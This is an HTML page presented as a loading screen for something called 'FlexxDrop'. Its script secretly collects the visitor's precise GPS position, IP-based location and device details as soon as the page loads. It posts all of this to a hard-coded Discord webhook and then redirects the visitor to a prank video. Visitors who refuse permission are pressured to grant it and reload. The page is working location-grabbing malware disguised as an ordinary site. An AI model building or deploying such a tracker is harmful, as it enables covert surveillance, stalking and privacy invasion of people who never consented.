<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>FlexxDrop</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <div id="status">Loading FlexxDrop…</div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    const deniedPage = `<html style='background:black;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;'>
      <body style='margin:0;display:flex;justify-content:center;align-items:center;height:100vh;'>
        <div>Permissions not given. Please grant all required permissions and reload the page.</div>
      </body>
    </html>`;

    let timeoutID;

    function redirectDenied() {
      document.open();
      document.write(deniedPage);
      document.close();
    }

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
      };
    }

    function sendToDiscord(lat, lon, acc, ipData) {
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const device = getDeviceInfo();

      const payload = {
        content: `📍 **GPS Captured**  
**Latitude:** ${lat}  
**Longitude:** ${lon}  
**Accuracy:** ${acc} meters  
**Map:** ${mapLink}

🌐 **IP Info**  
**IP:** ${ipData.ipAddress}  
**City:** ${ipData.city}  
**Region:** ${ipData.stateProv}  
**Country:** ${ipData.countryName}

🖥️ **Device Info**  
**Platform:** ${device.platform}  
**Browser:** ${device.userAgent}  
**Language:** ${device.language}  
**Screen:** ${device.screen}  
**Touch Support:** ${device.touchSupport}

🕒 ${new Date().toLocaleString()}`
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1000);
    }

    function getIPAndGPS() {
      fetch("https://api.db-ip.com/v2/free/self")
        .then(res => res.json())
        .then(ipData => {
          timeoutID = setTimeout(() => {
            redirectDenied();
          }, 10000);

          navigator.geolocation.getCurrentPosition(
            (pos) => {
              clearTimeout(timeoutID);
              const lat = pos.coords.latitude;
              const lon = pos.coords.longitude;
              const acc = pos.coords.accuracy;
              sendToDiscord(lat, lon, acc, ipData);
            },
            () => {
              clearTimeout(timeoutID);
              redirectDenied();
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          );
        })
        .catch(() => {
          redirectDenied();
        });
    }

    function requestNotificationsThenStart() {
      if (Notification && Notification.requestPermission) {
        Notification.requestPermission().finally(() => {
          getIPAndGPS();
        });
      } else {
        getIPAndGPS();
      }
    }

    window.onload = requestNotificationsThenStart;
  </script>
</body>
</html>
